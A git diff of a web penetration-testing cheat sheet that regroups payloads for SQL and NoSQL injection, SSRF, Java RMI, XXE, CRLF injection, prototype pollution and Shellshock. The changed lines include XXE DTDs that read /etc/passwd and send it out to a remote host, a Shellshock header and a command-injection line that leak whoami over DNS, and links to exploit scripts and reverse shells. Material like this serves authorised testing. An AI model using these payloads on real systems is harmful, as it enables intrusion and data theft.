@@ -875,17 +875,13 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 https://book.hacktricks.xyz/pentesting-web/sql-injection
   
 ### Tamper's SQLMAP
-  
--> randomcase.py
-  
--> order2ascii.py
 
--> xforwardedfor.py
- 
-### XPATH NOTATION
-  
-`%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -`
-  
+-> Tampers more common  
+randomcase.py, order2ascii.py, xforwardedfor.py
+
+-> second-order.py  
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/tampers/second-order.py
+
 ### Wordlist for SQL Injection - Bypass
 
 https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/e126452093b9cde7f82eff14a15f8ceca8188701/sqli-bypass-waf.txt
@@ -894,14 +890,14 @@ https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/
 
 https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md
   
-### Other
-  
+### Other script
 -> sqli.py  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/time-based/sqli.py
-  
--> second-order.py  
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/tampers/second-order.py
-  
+
+### XPATH Notation
+e.g.  
+`%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -` 
+
 ## NOSQL Injection
 
 -> Auth bypass  
@@ -911,11 +907,9 @@ username=admin&password[$regex]=^.{6}$
 username=admin&password[$regex]=^a.....  
   
 ## Graphql Introspection
-
 https://ivangoncharov.github.io/graphql-voyager/
   
 ## CSRF
-
 -> csrf.html  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf.html
   
@@ -1036,9 +1030,8 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 gopher://127.0.0.1:port/_
 
-### Scripts
-
--> memcached.py  
+#### Scripts
+-> edit memcached.py  
 `stats items`  
 `stats cachedump <slab class> <number of items to dump>`  
 `get <item>`  
@@ -1048,17 +1041,15 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/ssrf_protocol_smuggling/zabbix.py
 
 ### Tool's
-
 -> Gopherus  
 https://github.com/tarunkant/Gopherus
   
-### Docs for SSRF
-
+#### Docs for SSRF
 https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf  
 https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
 
 ## Insecure RMI
--> Example:  
+-> E.g.    
 //Open port Java RMI 9991  
 `jython sjet.py 192.168.11.136 9991 password install http://192.168.11.132:8000 8000`  
 `jython sjet.py 192.168.11.136 9991 password command "ls -la"`  
@@ -1096,7 +1087,6 @@ xhr.send(null);
 ``` 
 
 ### Null Origin Exploitation Exfiltrate via url per server
-
 -> nullorigin2.html
 ```
 <html><head>
@@ -1131,12 +1121,10 @@ xhr.send(null);
   
 -> Redirect via GET  
 `/%0d%0aLocation:attacker`  
-
 -> XSS via GET  
 `/%0d%0a%0d%0a<svg onload="alert(1)">`
 
 ## Elasticsearch - API
-
 -> Extract info  
 ```
 http://10.10.57.49:9200/_cat/indices?v  
@@ -1145,7 +1133,6 @@ http://10.10.57.49:9200/_search?pretty=true&q=pass
 ```
 
 ## XML External Entity - XXE
-
 ### Methods:
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -1155,9 +1142,7 @@ http://10.10.57.49:9200/_search?pretty=true&q=pass
 
 ## XXE - Blind Out-Of-Band
 ### Exfiltrate data exfiltrating data via dtd
-
 -> Part 1 (Main Request)
-
 ```
 <!DOCTYPE r[
 <!ELEMENT r ANY>
@@ -1169,7 +1154,6 @@ http://10.10.57.49:9200/_search?pretty=true&q=pass
 ```
   
 -> Part 2 (evil.dtd)
-  
 ```
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">  
 <!ENTITY % int "\<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">  
@@ -1177,9 +1161,6 @@ http://10.10.57.49:9200/_search?pretty=true&q=pass
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.dtd
 
 ### Retrieve data via error messages with dtd file
-  
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/error.dtd  
-
 -> Part 1 (Request Principal)
 ```
 <!DOCTYPE foo [
@@ -1194,19 +1175,21 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % payload "\<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/error.dtd  
+
 ```
   
 ### XInclude to retrieve files with dtd file
-
 `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/>\</foo>`
 
 ### Image file upload
 
-```<?xml version="1.0" standalone="yes"?>\<!DOCTYPE test [ \<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\<text font-size="16" x="0" y="16">&xxe;</text></svg>```  
+```
+<?xml version="1.0" standalone="yes"?>\<!DOCTYPE test [ \<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\<text font-size="16" x="0" y="16">&xxe;</text></svg>
+```  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.svg
 
 ## XSLT Server Side Injection
-  
 ### Identify  
 -> Transformation Service  
 -> XSLT engine  
@@ -1234,11 +1217,9 @@ version="1.0">
 ## Prototype Pollution
 
 ### Client Side
-  
 https://github.com/BlackFan/client-side-prototype-pollution
   
 ### Server Side
-
 -> exec.exec in req body with lodash - application/json
   
 ```
@@ -1272,31 +1253,25 @@ curl http://`whoami`.site.com/
 `"__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";`
 
 ### Shellshock
-
 `User-Agent: () { :; }; /usr/bin/nslookup $(whoami).site.com`
 
 ### CMS
-
 #### Wordpress
-
 -> Tool  
 `wpscan --url http://site.com/wordpress --api-token <your_token> --enumarate vp --plugins-detection aggressive`  
 https://wpscan.com/wordpress-security-scanner
 
 #### Joomla!
-
 -> Tool  
 https://github.com/oppsec/juumla
 
 #### Drupal
-
 -> Tool  
 https://github.com/SamJoan/droopescan
 
 ## Fuzzing (+) 
 
 ### Wordlist for subdomain fuzzing
-  
 https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
 
 ### Fuzzing Subdomain - DNS
@@ -1403,53 +1378,39 @@ https://chaos.projectdiscovery.io/#/
 https://github.com/michenriksen/aquatone
   
 ### Other tools and things
-  
-### ImageTragik
-
-codes/others/tragik.jpg
-  
+#### ImageTragik
+codes/others/tragik.jpg  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/rce/tragik.jpg
   
-### Search across a half million git repos
-  
+#### Search across a half million git repos
 https://grep.app
   
-### The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis.
-  
+#### The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis.
 https://gchq.github.io/CyberChef/
   
-### List of file signatures
-  
+#### List of file signatures
 https://en.wikipedia.org/wiki/List_of_file_signatures
 
-### Regex 
-  
+#### Regex 
 https://regex101.com/
 
-### Encode for SQL Injection in Json
-  
+#### Encode for SQL Injection in Json
 https://dencode.com/string/unicode-escape
   
-### Wildcard DNS
-
+#### Wildcard DNS
 https://nip.io/
   
-### Explain Shell
-
+#### Explain Shell
 https://explainshell.com/
 
-### CeWL - Custom Word List generator
-
+#### CeWL - Custom Word List generator
 https://github.com/digininja/CeWL
 
-### Webhook online
-  
+#### Webhook online
 https://webhook.site/#!/b3d5ed21-b58d-4a77-b19d-b7cdc2eeadc0
-  
-### Reverse Shell
-  
+
+#### Reverse Shell
 https://www.revshells.com/
  
-### Api Security
-
+#### Api Security
 https://platform.42crunch.com/
